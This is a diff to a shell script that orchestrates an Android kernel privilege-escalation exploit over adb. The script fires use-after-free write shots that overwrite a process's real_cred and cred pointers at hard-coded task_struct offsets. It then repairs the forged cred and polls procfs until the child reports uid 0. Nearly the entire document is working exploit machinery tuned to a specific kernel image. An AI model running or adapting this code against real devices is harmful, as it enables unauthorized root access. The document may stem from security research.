@@ -12,18 +12,26 @@
 #     three-thread futex protocol may still be live — that tears down half a
 #     wait queue.  The old runners retried because `probe_state` said "miss",
 #     but W1 proved `probe_state` is not a "did it land" signal.
-#   * The judge is the target's own readback:
-#       /proc/<pid>/status Uid  <- real_cred (task+0x778), what procfs reports
-#       the child's getuid()    <- cred      (task+0x780)
+#   * The judge is the target's own readback, and the GATE is after 0x780 +
+#     repair, never after 0x778:
+#       /proc/<pid>/status Uid  <- real_cred (task+0x778)   [recorded as data]
+#       the child's getuid()    <- cred      (task+0x780)   [the real gate]
+#     (procfs really does read real_cred -- get_task_cred() in this image loads
+#      task+0x778 -- but the write commits asynchronously, so an early read is
+#      not a verdict either way.  Poll it, record it, do not abort on it.)
 #   * The writer must not sit in sleep(HOLD): V12_PIN_FORK=1 forks a pin child
 #     that inherits the sockets, so the payload page stays alive while the
 #     writer returns immediately.
 #
-# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= MAXW= CHAINWAIT= CONTROL=1
-#   CONTROL=1 repeats the single 0x778 shot with V12_ALLOW_INIT_CRED=1 (write
-#   the global init_cred image instead of a sprayed page).  Only meaningful on a
-#   boot where the sprayed-page shot did NOT reboot — that contrast separates
-#   "the identity of write_value" from "the protocol itself".
+# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= CHAINWAIT= CONTROL=1
+#   CONTROL=1 fires the single 0x778 shot with V12_ALLOW_INIT_CRED=1, i.e.
+#   write_value = the init_cred image instead of a sprayed page.  It REPLACES
+#   the normal shot, it does not add one — run it as its own boot, and only
+#   after a boot in which the sprayed-page shot did NOT reboot:
+#     sprayed-page shot reboots, init_cred shot does not  -> the problem is the
+#       IDENTITY of write_value, not the UAF.
+#     both reboot                                          -> the problem is the
+#       protocol/retry/capture, independent of the cred content.
 set -u
 export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"
 
@@ -123,22 +131,53 @@ say "  baseline: $(uid_line "$CPID")"
 # itself.  Nothing is killed.
 shot() {  # $1=off $2=extra $3=tag -> echoes the write value it used
     local off=$1 extra=$2 tag=$3
-    A "rm -f $EV 2>/dev/null; true"
+    # A UNIQUE evidence path per shot.  Reusing one file means that if `rm -f`
+    # fails (a previous event can leave /data/local/tmp files root-owned and
+    # un-statable for shell), the poll reads the PREVIOUS shot's output and
+    # breaks immediately with the wrong content.
+    local ev="$DEV/bootA_ev_$tag.txt"
+    A "rm -f $ev 2>/dev/null; true"
     say "  [$tag] firing ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s ${extra:-}"
-    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=1 $extra V12B_EVIDENCE=$EV ./glxW W7 > $DEV/w7_$tag.log 2>&1 </dev/null &"
+    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=1 $extra V12B_EVIDENCE=$ev ./glxW W7 > $DEV/w7_$tag.log 2>&1 </dev/null &"
     local i out=""
     for i in $(seq 1 15); do            # capped at 15 s, not 90
         sleep 1
-        out=$(A "cat $EV 2>/dev/null" | tr -d '\r')
+        out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
         printf '%s' "$out" | grep -q 'write value' && break
     done
     sleep 2                             # let the store commit before judging
-    out=$(A "cat $EV 2>/dev/null" | tr -d '\r')
+    out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
     printf '%s\n' "$out" > "$OUT/w7_$tag.txt"
     grep -E 'write value|write_value|write_target|probe_state|probe_done|LOCAL repair|side effect|REFUSED|PIN child|HOLD' \
         "$OUT/w7_$tag.txt" | sed 's/^/    /'
     printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1
 }
+
+# Uid: in /proc/<pid>/status reads real_cred (task+0x778), NOT cred (task+0x780).
+# Proven twice: get_task_cred() in this kernel image does `add x9,x0,#0x778;
+# ldar x19,[x9]`, and task_state() then dereferences that pointer at exactly the
+# cred field offsets ([+4] uid, [+0x14] euid, [+0xc] suid, [+0x1c] fsuid, [+8]
+# gid, [+0x18] egid, [+0x10] sgid, [+0x20] fsgid, [+0x90] group_info) -- that is
+# the Uid/Gid/Groups block.  And out/t5_w7_778.txt, a 0x778-ONLY write, moved
+# this very line to `0 0 4294967176 0`.
+#
+# Even so, the write commits ASYNCHRONOUSLY ("chain async commit" in the code),
+# so a fixed 2 s read can miss a write that did land -- that is the real way to
+# get a false "did not take".  So: poll for a bounded window, record the result
+# as DATA, and never abort the sequence on it.  The gate is after 0x780 +
+# repair, because that is what getuid() reads.
+poll_uid() {   # $1=pid $2=timeout_s
+    local pid=$1 t=$2 i u=""
+    for i in $(seq 1 "$t"); do
+        u=$(uid_line "$pid")
+        case "$u" in
+            ""|*"2000 2000 2000 2000"*) sleep 1;;
+            *) echo "$u"; return 0;;
+        esac
+    done
+    echo "$u"
+}
+alive() { [ -n "$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')" ]; }
 
 say "=== step 5: ONE 0x778 shot (real_cred) ==="
 if [ "$CONTROL" = "1" ]; then
@@ -147,32 +186,44 @@ if [ "$CONTROL" = "1" ]; then
 else
     shot 0x778 "" w778 >/dev/null
 fi
-sleep 2
-U778=$(uid_line "$CPID")
-say "  after 0x778: [$U778]   (real_cred; procfs reads this one)"
+if ! alive; then say "  !! DEVICE GONE right after the 0x778 shot — that is the event"; exit 5; fi
+say "  polling /proc/$CPID/status Uid for up to 20s (async commit) ..."
+U778=$(poll_uid "$CPID" 20)
+say "  after 0x778: [$U778]"
 case "$U778" in
-  *"0 0"*) say "  → real_cred took.  Continuing to 0x780.";;
-  *)       say "  → real_cred did NOT take.  STOPPING here, per the one-shot rule:"
-           say "    do NOT add rounds in this boot.  Take a fresh boot, or rerun"
-           say "    with CONTROL=1 to compare write_value identities."
-           A "getprop ro.boot.bootreason; uptime" | tee "$OUT/05_stop.txt"
-           exit 4;;
+  *"0 0"*) say "  → real_cred took.";;
+  *)       say "  → real_cred has not moved (yet).  Recorded as data; NOT aborting —"
+           say "    the gate is 0x780 + repair, which is what getuid() reads.";;
 esac
+say "  machine alive: $(alive && echo yes || echo NO)"
 
 say "=== step 6: ONE 0x780 shot (cred) ==="
 CRED=$(shot 0x780 "" w780)
-sleep 2
-say "  after 0x780: [$(uid_line "$CPID")]"
-say "  child's own report: $(A "cat $RES 2>/dev/null | tail -1" | tr -d '\r')"
+if ! alive; then say "  !! DEVICE GONE right after the 0x780 shot"; exit 5; fi
+U780=$(poll_uid "$CPID" 12)
+say "  after 0x780: [$U780]"
 
 say "=== step 7: ONE local repair of that cred's +8 ==="
 if [ -n "$CRED" ]; then
     shot 0x780 "V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1 V12_W7_REPAIR_ADDR=$CRED" repair >/dev/null
-    sleep 2
-    say "  after repair: [$(uid_line "$CPID")]"
+    if ! alive; then say "  !! DEVICE GONE right after the repair shot"; exit 5; fi
+    UREP=$(poll_uid "$CPID" 12)
+    say "  after repair: [$UREP]"
 else
+    UREP="$U780"
     say "  !! no cred address captured — skipping repair"
 fi
+
+say "=== verdict (gate lives here, not after 0x778) ==="
+RPT=$(A "cat $RES 2>/dev/null | tail -1" | tr -d '\r')
+say "  /proc/$CPID/status Uid: [$UREP]"
+say "  child's own report:     [$RPT]"
+case "$UREP$RPT" in
+  *"0 0 0 0"*|*"uid=0"*|*"noexec"*)
+        say "  ★ CRED TOOK — this boot can answer the Boot A question.";;
+  *)    say "  ✗ cred did NOT take in this boot.  One shot was fired per offset,"
+        say "    nothing was killed; take a fresh boot rather than adding rounds.";;
+esac
 
 say "=== step 8: poke LT parent ==="
 [ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
